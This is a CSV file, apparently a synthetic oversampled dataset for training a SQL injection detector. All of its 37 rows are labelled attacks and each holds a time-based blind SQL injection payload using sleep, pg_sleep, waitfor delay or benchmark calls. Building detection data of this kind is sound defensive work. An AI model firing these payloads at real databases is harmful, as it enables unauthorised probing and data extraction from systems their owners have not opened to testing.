id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000200,0.32476124616360563
SMOTE_000002,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000287,0.813117937395185
SMOTE_000003,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000155,0.4340118443701945
SMOTE_000004,attack,time,"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000234,0.7579134083941433
SMOTE_000005,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000129,0.13174570185851792
SMOTE_000006,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000303,0.6994171074103301
SMOTE_000007,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.5983226611238119
SMOTE_000008,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000199,0.7350277838037967
SMOTE_000009,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,5.146006259539031
SMOTE_000010,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000138,1.3340781624911757
SMOTE_000011,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.19745991657054912
SMOTE_000012,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000081,0.1427537852044647
SMOTE_000013,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000075,0.2200471313232041
SMOTE_000014,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000089,0.23623122512436054
SMOTE_000015,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000132,0.3361705068658688
SMOTE_000016,attack,time,select sleep  (  5  )  # wihl,nearest_attack_euclidean,R000309,0.0338723183239234
SMOTE_000017,attack,time,1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000187,0.9337922356031918
SMOTE_000018,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.08231290673084461
SMOTE_000019,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000232,0.38296391556223913
SMOTE_000020,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,0.8142142287394837
SMOTE_000021,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.08481982524028876
SMOTE_000022,attack,time,1' where 6035  =  6035 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000241,0.30364567773794804
SMOTE_000023,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000145,0.4690429923337706
SMOTE_000024,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000308,0.6129800853571321
SMOTE_000025,attack,time,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000264,0.47006758403621496
SMOTE_000026,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.7341412520955048
SMOTE_000027,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R000240,1.4232373518978727
SMOTE_000028,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,2.0589113194272923
SMOTE_000029,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",nearest_attack_euclidean,R000268,0.41068277916418533
SMOTE_000030,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R000281,0.698228647741975
SMOTE_000031,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000072,0.3635084932385585
SMOTE_000032,attack,time,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',nearest_attack_euclidean,R000124,1.140897866681607
SMOTE_000033,attack,time,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000303,0.0764804891829027
SMOTE_000034,attack,time,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,nearest_attack_euclidean,R000162,1.1362686994691358
SMOTE_000035,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000054,0.6033099996542529
SMOTE_000036,attack,time,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000078,0.2990752657938998
SMOTE_000037,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000287,0.3455111584326763
